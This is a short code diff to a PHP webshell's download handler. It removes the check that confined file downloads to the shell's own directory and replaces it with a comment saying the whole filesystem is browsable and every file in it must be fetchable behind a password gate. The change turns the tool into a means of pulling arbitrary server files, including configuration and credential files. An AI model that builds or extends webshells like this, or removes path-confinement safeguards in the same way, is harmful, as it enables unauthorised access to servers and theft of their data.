@@ -14,12 +14,9 @@ if (isset($_GET['download'])) {
         exit;
     }
     $real = $realResult['path'];
-    // Confine downloads to the webshell's working directory tree.
-    $rootResult = shells_x_realpath(getcwd() ?: '.');
-    if (isset($rootResult['error']) || !shells_x_is_path_allowed($real, [$rootResult['path']])) {
-        http_response_code(403);
-        exit;
-    }
+    // Access control is the auth gate (password + session); downloads are
+    // not additionally confined to the shell's directory — the file browser
+    // navigates the whole filesystem and any browsed file must be fetchable.
     header('Content-Description: File Transfer');
     header('Content-Type: application/octet-stream');
     header('Content-Disposition: attachment; filename="' . str_replace(['"', "\r", "\n"], '', basename($real)) . '"');
